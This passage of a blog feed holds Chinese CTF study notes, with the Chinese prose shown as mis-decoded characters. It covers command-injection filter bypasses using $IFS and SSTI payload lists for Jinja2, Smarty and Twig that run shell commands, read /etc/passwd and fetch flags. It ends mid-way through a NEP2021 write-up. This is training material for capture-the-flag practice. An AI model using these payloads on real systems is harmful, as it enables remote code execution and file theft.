<span class="comment"># è¿‡æ»¤äº†/ å’Œ *å­—ç¬¦</span></span><br><span class="line"></span><br><span class="line">ip=1;cat<span class="variable">$IFSflag</span>.php</span><br><span class="line">è¿”å› fxck your flag! <span class="comment"># è¿‡æ»¤äº† &#x27;flag&#x27; ä½†æ˜¯$IFSæ²¡è¢«è¿‡æ»¤</span></span><br></pre></td></tr></table></figure><p>è¯•è¯•å†…è”æ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip=1;a=f;b=ag;c=l;cat$IFS$a$c<span class="variable">$b</span>.php</span><br><span class="line">ctrl + uæŸ¥çœ‹æºä»£ç å³å¯å¾—åˆ°flag</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒæ–‡æ¡£"><a href="#å‚è€ƒæ–‡æ¡£" class="headerlink" title="å‚è€ƒæ–‡æ¡£"></a>å‚è€ƒæ–‡æ¡£</h2><p><a href="https://blog.csdn.net/qq_42812036/article/details/104297163?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161699126116780264045852%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161699126116780264045852&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-104297163.first_rank_v2_pc_rank_v29&amp;utm_term=ping+%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/qq_42812036/article/details/104297163?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161699126116780264045852%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161699126116780264045852&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-104297163.first_rank_v2_pc_rank_v29&amp;utm_term=ping+%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4187</a></p><p><a href="https://blog.csdn.net/u014549283/article/details/81783164?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161690037516780357237205%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161690037516780357237205&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-81783164.first_rank_v2_pc_rank_v29&amp;utm_term=ping+%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/u014549283/article/details/81783164?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161690037516780357237205%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161690037516780357237205&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-81783164.first_rank_v2_pc_rank_v29&amp;utm_term=ping+%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4187</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‘½ä»¤æ³¨å…¥çŸ¥è¯†ç‚¹æ€»ç»“&quot;&gt;&lt;a href=&quot;#å‘½ä»¤æ³¨å…¥çŸ¥è¯†ç‚¹æ€»ç»“&quot; class=&quot;headerlink&quot; title=&quot;å‘½ä»¤æ³¨å…¥çŸ¥è¯†ç‚¹æ€»ç»“&quot;&gt;&lt;/a&gt;å‘½ä»¤æ³¨å…¥çŸ¥è¯†ç‚¹æ€»ç»“&lt;/h2&gt;&lt;h3 id=&quot;è¿‡æ»¤ç©ºæ ¼&quot;&gt;&lt;a href=&quot;#è¿‡æ»¤ç©ºæ ¼&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="Web" scheme="https://lucifer-rossweisse.github.io/categories/Web/"/>
    
    
    <category term="CTF" scheme="https://lucifer-rossweisse.github.io/tags/CTF/"/>
    
    <category term="Web" scheme="https://lucifer-rossweisse.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>SSTIå°æ€»ç»“</title>
    <link href="https://lucifer-rossweisse.github.io/2021/03/26/web%E5%AD%A6%E4%B9%A0/SSTI%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
    <id>https://lucifer-rossweisse.github.io/2021/03/26/web%E5%AD%A6%E4%B9%A0/SSTI%E5%B0%8F%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-25T17:24:55.000Z</published>
    <updated>2021-07-23T03:26:41.772Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¨¡æ¿æ³¨å…¥-SSTI-çš„ç®€å•æ€»ç»“"><a href="#æ¨¡æ¿æ³¨å…¥-SSTI-çš„ç®€å•æ€»ç»“" class="headerlink" title="æ¨¡æ¿æ³¨å…¥(SSTI)çš„ç®€å•æ€»ç»“"></a>æ¨¡æ¿æ³¨å…¥(SSTI)çš„ç®€å•æ€»ç»“</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç”±äºç°åœ¨è¿˜æ˜¯èŒæ–°æ—¶æœŸï¼Œè¿™æ—¶å€™å†³å®šå…ˆå†™ä¸€ç¯‡å…³äºæ¨¡æ¿æ³¨å…¥çš„ç®€å•æ€»ç»“ç»™è‡ªå·±ç”¨ã€‚</p><h2 id="SSTIçš„ç®€å•æµ‹è¯•"><a href="#SSTIçš„ç®€å•æµ‹è¯•" class="headerlink" title="SSTIçš„ç®€å•æµ‹è¯•"></a>SSTIçš„ç®€å•æµ‹è¯•</h2><p><img src="https://i.loli.net/2021/03/25/uwZaFe4Tx8MR6DG.png"></p><h2 id="å„æ¡†æ¶çš„æ¨¡æ¿ç»“æ„"><a href="#å„æ¡†æ¶çš„æ¨¡æ¿ç»“æ„" class="headerlink" title="å„æ¡†æ¶çš„æ¨¡æ¿ç»“æ„"></a>å„æ¡†æ¶çš„æ¨¡æ¿ç»“æ„</h2><p><img src="https://i.loli.net/2021/03/25/fRsgd7tD6mQNHyB.png"></p><h2 id="jinja2"><a href="#jinja2" class="headerlink" title="jinja2"></a>jinja2</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>åœ¨ç¼ºçœæƒ…å†µä¸‹ï¼Œä»¥ä¸‹å…¨å±€å˜é‡å¯ä»¥åœ¨ Jinja2 æ¨¡æ¿ä¸­ä½¿ç”¨ï¼š</p><ul><li><p><code>config</code></p><p>å½“å‰é…ç½®å¯¹è±¡ï¼ˆ <code>flask.config</code> ï¼‰tipsï¼šè¿™ä¸ªå˜é‡æ€»æ˜¯å¯ç”¨ï¼Œç”šè‡³æ˜¯åœ¨è¢«å¯¼å…¥çš„æ¨¡æ¿ä¸­ã€‚</p></li><li><p><code>request</code></p><p>å½“å‰è¯·æ±‚å¯¹è±¡ï¼ˆ <code>flask.request</code> ï¼‰ã€‚ åœ¨æ²¡æœ‰æ´»åŠ¨è¯·æ±‚ç¯å¢ƒæƒ…å†µä¸‹æ¸²æŸ“æ¨¡æ¿æ—¶ï¼Œè¿™ä¸ªå˜é‡ä¸å¯ç”¨ã€‚</p></li><li><p><code>session</code></p><p>å½“å‰ä¼šè¯å¯¹è±¡ï¼ˆ <code>flask.session</code> ï¼‰ã€‚ åœ¨æ²¡æœ‰æ´»åŠ¨è¯·æ±‚ç¯å¢ƒæƒ…å†µä¸‹æ¸²æŸ“æ¨¡æ¿æ—¶ï¼Œè¿™ä¸ªå˜é‡ä¸å¯ç”¨ã€‚</p></li><li><p><code>g</code></p><p>è¯·æ±‚ç»‘å®šçš„å…¨å±€å˜é‡ï¼ˆ <code>flask.g</code>ï¼‰ã€‚ åœ¨æ²¡æœ‰æ´»åŠ¨è¯·æ±‚ç¯å¢ƒæƒ…å†µä¸‹æ¸²æŸ“æ¨¡æ¿æ—¶ï¼Œè¿™ä¸ªå˜é‡ä¸å¯ç”¨ã€‚</p></li><li><p><code>url_for()</code></p><p><code>flask.url_for()</code>å‡½æ•°ã€‚</p></li><li><p><code>get_flashed_messages()</code></p><p><code>flask.get_flashed_messages()</code> å‡½æ•°ã€‚</p></li></ul><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>åœ¨pythonçš„SSTIä¸­ï¼Œå¤§éƒ¨åˆ†æ˜¯ä¾é åŸºç±»-&gt;å­ç±»-&gt;å±é™©å‡½æ•°çš„æ–¹å¼æ¥åˆ©ç”¨sstiã€‚</p><ul><li><code>__class__</code></li></ul><p>ä¸‡ç‰©çš†å¯¹è±¡ï¼Œè€Œ<strong>class</strong>ç”¨äºè¿”å›è¯¥å¯¹è±¡æ‰€å±çš„ç±»ï¼Œæ¯”å¦‚æŸä¸ªå­—ç¬¦ä¸²ï¼Œä»–çš„å¯¹è±¡ä¸ºå­—ç¬¦ä¸²å¯¹è±¡ï¼Œè€Œå…¶æ‰€å±çš„ç±»ä¸º<code>&lt;class &#39;str&#39;&gt;</code>ã€‚</p><ul><li><code>__bases__</code></li></ul><p>ä»¥å…ƒç»„çš„å½¢å¼è¿”å›ä¸€ä¸ªç±»æ‰€ç›´æ¥ç»§æ‰¿çš„ç±»ã€‚</p><ul><li><code>__mro__</code></li></ul><p>è¿”å›è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåºã€‚</p><ul><li><code>__subclasses__()</code></li></ul><p>è·å–ç±»çš„æ‰€æœ‰å­ç±»ã€‚</p><ul><li><code>__init__</code></li></ul><p>æ‰€æœ‰è‡ªå¸¦å¸¦ç±»éƒ½åŒ…å«<strong>init</strong>æ–¹æ³•ï¼Œä¾¿äºåˆ©ç”¨ä»–å½“è·³æ¿æ¥è°ƒç”¨<strong>globals</strong>ã€‚</p><ul><li><code>__globals__</code></li></ul><p><code>function.__globals__</code>ï¼Œç”¨äºè·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„moduleã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡ã€‚</p><h3 id="å¸¸è§payload"><a href="#å¸¸è§payload" class="headerlink" title="å¸¸è§payload"></a>å¸¸è§payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">177</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;cat /fl4g|base64&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># python2</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).__dict__[<span class="string">&#x27;pop&#x27;</span>+<span class="string">&#x27;en&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h3 id="ç»•è¿‡å§¿åŠ¿"><a href="#ç»•è¿‡å§¿åŠ¿" class="headerlink" title="ç»•è¿‡å§¿åŠ¿"></a>ç»•è¿‡å§¿åŠ¿</h3><h4 id="æµ‹è¯•SSTIè¿‡æ»¤"><a href="#æµ‹è¯•SSTIè¿‡æ»¤" class="headerlink" title="æµ‹è¯•SSTIè¿‡æ»¤"></a>æµ‹è¯•SSTIè¿‡æ»¤</h4><p><code>&#123;&#123;"è¦æµ‹è¯•çš„å­—ç¬¦"&#125;&#125;</code>ï¼Œåªéœ€è¦çœ‹çœ‹è¦æµ‹è¯•çš„å­—ç¬¦æ˜¯å¦è¿”å›åœ¨é¡µé¢ä¸­å³å¯ï¼Œä¸‹é¢åˆ†åˆ«è¯´è¯´å¯¹åº”å„ç§è¿‡æ»¤æƒ…å†µçš„è§£å†³åŠæ³•ã€‚</p><h4 id="è¿‡æ»¤"><a href="#è¿‡æ»¤" class="headerlink" title="è¿‡æ»¤ "></a>è¿‡æ»¤ </h4><p>ä½¿ç”¨<code>&#123;%`è¿›è¡Œç»•è¿‡ï¼Œ`&#123;%%&#125;</code>ä¸­é—´æ‰§è¡Œifè¯­å¥å¯ä»¥èµ·åˆ°ç±»ä¼¼ç›²æ³¨çš„æ•ˆæœ</p><h4 id="è¿‡æ»¤-1"><a href="#è¿‡æ»¤-1" class="headerlink" title="è¿‡æ»¤_"></a>è¿‡æ»¤<code>_</code></h4><p>å¯ä»¥ç”¨ç¼–ç ç»•è¿‡</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å¦‚ä¸‹</span></span><br><span class="line">__class__ =&gt; &#x27;\x5f\x5fclass\x5f\x5f&#x27;</span><br></pre></td></tr></table></figure><p><code>_</code> =&gt; <code>\x5f</code> ï¼Œ <code>.</code> =&gt; <code>\x2e</code></p><p>è¿‡æ»¤äº†_å¯ä»¥ç”¨<code>request[&#39;args&#39;]</code>æˆ–è€…<code>request[&#39;values&#39;]ç»•è¿‡</code></p><p>å¦‚æœè¿‡æ»¤äº†<code>args</code>ä¹Ÿå¯ä»¥<code>request[&#39;values&#39;]</code>ç»“åˆ<code>attr()</code>ç»•è¿‡</p><p>å¦‚ï¼š<code>&#39;&#39;.__class__</code> å¯ä»¥å†™æˆ <code>&#39;&#39;|attr(request[&#39;values&#39;][&#39;x1&#39;])</code>ï¼Œç„¶åPOSTä¼ å…¥<code>x1=__class__</code></p><h4 id="è¿‡æ»¤-2"><a href="#è¿‡æ»¤-2" class="headerlink" title="è¿‡æ»¤."></a>è¿‡æ»¤<code>.</code></h4><p>å¯ä»¥ç”¨<code>attr()</code>æˆ–<code>[]</code>ç»•è¿‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¾‹å¦‚</span></span><br><span class="line"><span class="comment"># æ­£å¸¸çš„payload</span></span><br><span class="line">url?name=&#123;&#123;().__class__.__base__.__subclasses__[177].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ipconfig&quot;).read()&#x27;)&#125;&#125;`</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨attr()ç»•è¿‡</span></span><br><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="number">177</span>)|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;__builtins__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨[]ç»•è¿‡</span></span><br><span class="line">url?name=&#123;&#123; config[&#x27;__class__&#x27;][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;ipconfig&#x27;)[&#x27;read&#x27;]() &#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># tipsï¼š</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__ å¯ä»¥å†™æˆ <span class="built_in">getattr</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&quot;__class__&quot;</span>) æˆ–è€… <span class="string">&#x27;&#x27;</span>|attr(<span class="string">&quot;__class__&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="è¿‡æ»¤-3"><a href="#è¿‡æ»¤-3" class="headerlink" title="è¿‡æ»¤[]"></a>è¿‡æ»¤<code>[]</code></h4><p>å¯ä»¥ä½¿ç”¨<code>getitem()</code>æ¥è·å–åºå·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[2] =&gt;</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨è¯·æ±‚æ–¹å¼requestsç»•è¿‡"><a href="#åˆ©ç”¨è¯·æ±‚æ–¹å¼requestsç»•è¿‡" class="headerlink" title="åˆ©ç”¨è¯·æ±‚æ–¹å¼requestsç»•è¿‡"></a>åˆ©ç”¨è¯·æ±‚æ–¹å¼requestsç»•è¿‡</h4><p>å¯¹äºæŸäº›è¾ƒä¸ºä¸¥æ ¼çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥é€‰ç€ç”¨<code>requests</code>çš„æ–¹å¼ç»•è¿‡</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¾‹å¦‚</span></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125; =&gt; &#123;&#123;&#x27;&#x27;[request.args.t1]&#125;&#125;&amp;t1=__class__</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆæˆ–è€…</span></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125; =&gt; &#123;&#123;&#x27;&#x27;[request[&#x27;args&#x27;][&#x27;t1&#x27;]]&#125;&#125;&amp;t1=__class__</span><br></pre></td></tr></table></figure><h2 id="smarty"><a href="#smarty" class="headerlink" title="smarty"></a>smarty</h2><p>Smartyæ˜¯ä¸€ä¸ªPHPçš„æ¨¡æ¿å¼•æ“ï¼Œæä¾›è®©ç¨‹åºé€»è¾‘ä¸é¡µé¢æ˜¾ç¤ºï¼ˆHTML/CSSï¼‰ä»£ç åˆ†ç¦»çš„åŠŸèƒ½ã€‚æ‰€ä»¥å¯¹äºSmartyçš„SSTIçš„åˆ©ç”¨æ‰‹æ®µä¸å¸¸è§çš„flaskçš„SSTIæœ‰å¾ˆå¤§åŒºåˆ«ã€‚</p><h3 id="æ¼æ´ç¡®è®¤"><a href="#æ¼æ´ç¡®è®¤" class="headerlink" title="æ¼æ´ç¡®è®¤"></a>æ¼æ´ç¡®è®¤</h3><p>åŸºæœ¬çš„æµ‹è¯•å¯ä»¥æ ¹æ®ä¸Šé¢çš„é‚£å¼ å›¾ç‰‡ï¼Œä¹Ÿå¯ä»¥è¾“å…¥<code>&#123;$smarty.version&#125;</code>æŸ¥çœ‹Smartyçš„ç‰ˆæœ¬ä¿¡æ¯ã€‚</p><h3 id="å¸¸ç”¨payload"><a href="#å¸¸ç”¨payload" class="headerlink" title="å¸¸ç”¨payload"></a>å¸¸ç”¨payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> phpinfo()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">&#x27;ls&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123; readfile(<span class="string">&#x27;/flag&#x27;</span>) &#125;</span><br><span class="line">&#123;<span class="keyword">if</span> show_source(<span class="string">&#x27;/flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">&#x27;cat ../../../flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125; </span><br></pre></td></tr></table></figure><h3 id="å¸¸è§çš„æ¼æ´åˆ©ç”¨æ–¹å¼"><a href="#å¸¸è§çš„æ¼æ´åˆ©ç”¨æ–¹å¼" class="headerlink" title="å¸¸è§çš„æ¼æ´åˆ©ç”¨æ–¹å¼"></a>å¸¸è§çš„æ¼æ´åˆ©ç”¨æ–¹å¼</h3><h4 id="php-php-æ ‡ç­¾"><a href="#php-php-æ ‡ç­¾" class="headerlink" title="{php}{/php}æ ‡ç­¾"></a>{php}{/php}æ ‡ç­¾</h4><p>Smartyæ”¯æŒ ä½¿ç”¨<code>&#123;php&#125;&#123;/php&#125;</code>æ ‡ç­¾æ¥æ‰§è¡Œè¢«åŒ…è£¹å…¶ä¸­çš„phpæŒ‡ä»¤ï¼Œæœ€å¸¸è§„çš„æ€è·¯åº”è¯¥æ˜¯å…ˆæµ‹è¯•è¿™ä¸ªæ ‡ç­¾ã€‚</p><p>ä½†æ˜¯ï¼Œåœ¨Smarty3çš„å®˜æ–¹æ‰‹å†Œä¸­æœ‰å¦‚ä¸‹æè¿°ï¼š</p><blockquote><p>Smartyå·²ç»åºŸå¼ƒ{php}æ ‡ç­¾ï¼Œå¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨ã€‚åœ¨Smarty 3.1ï¼Œ{php}ä»…åœ¨SmartyBCä¸­å¯ç”¨ã€‚</p></blockquote><p>æ‰€ä»¥ï¼Œä¸€èˆ¬åœ¨Smartyç±»ä¸­æ˜¯ç”¨ä¸äº†çš„ã€‚</p><h4 id="if-æ ‡ç­¾"><a href="#if-æ ‡ç­¾" class="headerlink" title="{if}æ ‡ç­¾"></a>{if}æ ‡ç­¾</h4><p>åœ¨å®˜æ–¹æ–‡æ¡£ä¸­æœ‰å¦‚ä¸‹æè¿°ï¼š</p><blockquote><p>Smartyçš„<code>&#123;if&#125;</code>æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„iféå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª{if}å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„{/if}ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨{else} å’Œ {elseif}ï¼Œå…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œå¦‚||, or, &amp;&amp;, and, is_array(), ç­‰ç­‰ï¼Œå¦‚ï¼š<code>&#123;if is_array($array)&#125;&#123;/if&#125;</code></p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥æ‰§è¡Œæˆ‘ä»¬çš„phpä»£ç </p><p>å¦‚ï¼š{if phpinfo()}{/if}</p><p><img src="https://i.loli.net/2021/04/11/POjHBeb3cG2XTa9.png"></p><h2 id="twig"><a href="#twig" class="headerlink" title="twig"></a>twig</h2><h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p>Twigçš„æ¨¡æ¿æ³¨å…¥ï¼Œåˆ¤æ–­å¦‚ä¸‹ï¼š</p>49 å›æ˜¾7777777 => Jinja2 ï¼Œå›æ˜¾49 => Twig<p>payload</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><blockquote><p>flag{c485b15c-f3df-4dc8-abb3-ed322ea30c66}</p></blockquote><h2 id="å‚è€ƒæ–‡æ¡£"><a href="#å‚è€ƒæ–‡æ¡£" class="headerlink" title="å‚è€ƒæ–‡æ¡£"></a>å‚è€ƒæ–‡æ¡£</h2><p><a href="https://blog.csdn.net/solitudi/article/details/107752717?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161669108716780271543102%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=161669108716780271543102&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-107752717.pc_v2_rank_blog_default&amp;utm_term=%E6%A8%A1%E6%9D%BF">https://blog.csdn.net/solitudi/article/details/107752717?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161669108716780271543102%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=161669108716780271543102&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-107752717.pc_v2_rank_blog_default&amp;utm_term=%E6%A8%A1%E6%9D%BF</a></p><p><a href="https://xz.aliyun.com/t/6885">https://xz.aliyun.com/t/6885</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/107556915?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161812604616780261937076%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161812604616780261937076&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-107556915.first_rank_v2_pc_rank_v29&amp;utm_term=smarty%E6%B3%A8%E5%85%A5">https://blog.csdn.net/qq_45521281/article/details/107556915?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161812604616780261937076%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161812604616780261937076&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-107556915.first_rank_v2_pc_rank_v29&amp;utm_term=smarty%E6%B3%A8%E5%85%A5</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ¨¡æ¿æ³¨å…¥-SSTI-çš„ç®€å•æ€»ç»“&quot;&gt;&lt;a href=&quot;#æ¨¡æ¿æ³¨å…¥-SSTI-çš„ç®€å•æ€»ç»“&quot; class=&quot;headerlink&quot; title=&quot;æ¨¡æ¿æ³¨å…¥(SSTI)çš„ç®€å•æ€»ç»“&quot;&gt;&lt;/a&gt;æ¨¡æ¿æ³¨å…¥(SSTI)çš„ç®€å•æ€»ç»“&lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="Web" scheme="https://lucifer-rossweisse.github.io/categories/Web/"/>
    
    
    <category term="CTF" scheme="https://lucifer-rossweisse.github.io/tags/CTF/"/>
    
    <category term="Web" scheme="https://lucifer-rossweisse.github.io/tags/Web/"/>
    
    <category term="python" scheme="https://lucifer-rossweisse.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>nep2021éƒ¨åˆ†WriteUp</title>
    <link href="https://lucifer-rossweisse.github.io/2021/03/24/WriteUp/nep2021/"/>
    <id>https://lucifer-rossweisse.github.io/2021/03/24/WriteUp/nep2021/</id>
    <published>2021-03-24T09:47:04.000Z</published>
    <updated>2021-08-07T11:29:34.098Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><a id="more"></a><p>å¯¹äºæœ¬èŒæ–°æ¥è¯´ï¼Œè¿™æ¬¡çš„nepæ¯”èµ›æ˜¯éå¸¸å¥½çš„ä¸€æ¬¡å†ç»ƒæœºä¼šï¼ˆè™½ç„¶webä¸€é“éƒ½æ²¡æœ‰å†™å‡ºæ¥QAQï¼Œä½†æ˜¯ä¹‹åå¤ç°åå­¦åˆ°äº†å¾ˆå¤šæ–°çš„å§¿åŠ¿ï¼Œç›¸å¯¹æ¥è¯´è¿˜æ˜¯æœ‰ç‚¹æå‡çš„ï¼Œå˜¿å˜¿ã€‚</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h3><p>æ‰“å¼€é¢˜ç›®åå‘ç°ä¸€ä¸²ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$nep</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>];</span><br><span class="line">    <span class="variable">$len</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;len&#x27;</span>];</span><br><span class="line">    <span 